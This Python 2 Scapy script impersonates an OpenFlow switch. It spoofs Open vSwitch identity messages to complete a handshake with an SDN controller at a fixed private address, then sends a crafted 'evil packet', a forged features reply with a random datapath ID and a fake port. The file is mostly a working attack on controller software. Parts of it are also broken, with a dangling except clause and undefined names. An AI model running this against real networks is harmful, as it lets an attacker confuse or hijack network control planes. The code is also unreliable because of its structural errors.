import scapy.contrib.openflow as of
import socket
import time
import sys
from scapy.all import *
import binascii as b
import os

dIP="192.168.56.102"
dPort = 6633
port_id = "s1"
hw_addr = "\x32\x45\xe5\xd5\x0a\x42"
dPID = int(('\x00\x00'+hw_addr).encode('hex'), 16)# int(('\x00\x00'+hw_addr).encode('hex'), 16)


def RandDPID():
	s = ""
	for x in range(8):
		s = s + chr(int(b.b2a_hex(os.urandom(1)), 16))

	return int(s.encode('hex'),16) 

# Craft evil packet
p = of.OpenFlow()/of.OFPTFeaturesReply(datapath_id=RandDPID())\
	/of.OFPPhyPort(port_no=65534, hw_addr=RandMAC(), port_name="evilport", config=1, state=1)

# Create handshake packet
m1 = of.OpenFlow()/of.OFPTHello()

m2 = of.OpenFlow()/of.OFPTFeaturesReply(datapath_id=dPID, len=80, n_buffers=256, n_tables=255, capabilities=199, actions=4095)\
	/of.OFPPhyPort(port_no=65534, hw_addr=hw_addr, port_name=port_id, config=1, state=1)

m3 = of.OpenFlow()/of.OFPTGetConfigReply(miss_send_len=65535)

m4 = of.OpenFlow()/of.OFPTStatsReplyDesc(mfr_desc='Nicira, Inc', hw_desc='Open vSwitch', \
	sw_desc='1.9.3', serial_num='None', dp_desc='None')

while 1:
	for x in range(1):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((dIP, dPort))
			ss = StreamSocket(s,Raw)
		except socket.error,e:
			print e[0]
			exit()

	# Get controller HELLO
	r0 = of.OpenFlow(s.recv(2048))
	if r0.name is "OFPT_HELLO": print "Received: HELLO"
	else: 
		print "Did not recieve HELLO. Received:"
		r0.show()

	# Send HELLO
	try:
		print "Sending: HELLO"
		m1.xid = r0.xid
		r = of.OpenFlow(ss.sr1(of.Raw(str(m1))).load)
		if r.name is "OFPT_FEATURES_REQUEST": print "Received: FEATURES REQUEST"
		else:
			print "Did not recieve FEATURES REQUEST Received:"
			r.show()
	except socket.error,e:
		print "Socket closed: by server"
		exit()

	# Sending FEATURES_REPLY
	try:
		print "Sending: FEATURES_REPLY"
		m2.xid = r0.xid
		
		print "Show() FEATURES_REPLY"
		m2.show()

		print "Sending M2 Now"

		print repr(of.raw(str(m2)))

		ss.send(of.raw(str(m2)))

		r2=s.recv(2048)
		if r2 ==b'':
			raise RuntimeError("socket connection broken")
		print("Received: " + repr(r2))

		print 'Printing R2'

		print repr(of.raw(r2))

		r2 = of.OpenFlow(r2)
		r2.show()


		#r2 = of.OpenFlow(ss.sr1(of.raw(str(m2))).load)

		print "Finished Sending"

		r3 = of.OpenFlow(r2.payload.payload.load)
		print "Received R3"
		r3.show()

		r4 = of.OpenFlow(r3.payload.payload.load)
		print "Received R4"
		r4.show()

		if (type(r2.payload) is of.OFPT_SET_CONFIG) and (type(r3.payload) is OFPT_GET_CONFIG_REQUEST) and (type(r4.payload) is OFPT_STATS_REQUEST): print "Continued: handshake"
		else:
			print "Received: "
			r2.show()
	except socket.error,e:
		print "Socket closed: by server"
		exit()
	except AttributeError, e:
	# 	# sometimes all 3 messages don't come
		print "Attribute Error"
		pass

	# Send GET_CONGIF_REPLY and STATS_REPLY
		print "Sending: GET_CONGIF_REPLY"
		ss.send(of.raw(str(m3)))

	except socket.error,e:
		print "Socket closed: by server"
		exit()

	try:
		print "Sending: STATS_REPLY"
		# r4 = of.OpenFlow(ss.sr1(of.raw(str(m4))).load)

		ss.send(of.raw(str(m4)))

		r4=s.recv(2048)
		if r4 ==b'':
			raise RuntimeError("socket connection broken")
		print("Received: " + repr(r4))

		print 'Printing R4'

		print repr(of.raw(r4))

		r4 = of.OpenFlow(r4)
		r4.show()


		if (r4.name is 'OFPT_FLOW_MOD'): print "Received: FLOW_MOD"
		else:
			print "Receieved: "
			r4.show()

	except socket.error,e:
		print "Socket closed: by server"
		exit()


	# END HANDSHAKEE
	# Send malicious packet
	try:
		print "Sending: craft packet"
		ss.send(of.Raw(str(p)))
	except:
		print "Socket closed: by server"



